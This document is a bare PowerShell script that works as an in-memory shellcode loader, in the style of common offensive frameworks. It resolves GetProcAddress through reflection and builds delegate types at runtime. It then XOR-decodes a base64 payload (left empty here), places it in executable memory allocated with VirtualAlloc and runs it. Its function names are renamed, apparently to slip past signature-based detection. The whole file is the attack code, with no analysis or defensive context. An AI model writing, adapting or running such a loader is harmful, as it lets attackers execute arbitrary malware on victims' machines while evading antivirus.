function getdelly {
	Param (
		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $prammy,
		[Parameter(Position = 1)] [Type] $returny = [Void]
	)

	$buildy = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
	$buildy.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $prammy).SetImplementationFlags('Runtime, Managed')
	$buildy.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $returny, $prammy).SetImplementationFlags('Runtime, Managed')

	return $buildy.CreateType()
}

function getaddy {
	Param ($moddy, $proccy)		
	$unsafey = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
	$var_gpa = $unsafey.GetMethod('GetProcAddress', [Type[]] @('System.Runtime.InteropServices.HandleRef', 'string'))
	return $var_gpa.Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($unsafey.GetMethod('GetModuleHandle')).Invoke($null, @($moddy)))), $proccy))
}

If ([IntPtr]::size -eq 8) {
	[Byte[]]$var_code = [System.Convert]::FromBase64String('')

	for ($x = 0; $x -lt $var_code.Count; $x++) {
		$var_code[$x] = $var_code[$x] -bxor 35
	}

	$var_va = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((getaddy kernel32.dll VirtualAlloc), (getdelly @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])))
	$var_buffer = $var_va.Invoke([IntPtr]::Zero, $var_code.Length, 0x3000, 0x40)
	[System.Runtime.InteropServices.Marshal]::Copy($var_code, 0, $var_buffer, $var_code.length)

	$runny = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($var_buffer, (getdelly @([IntPtr]) ([Void])))
	$runny.Invoke([IntPtr]::Zero)
}
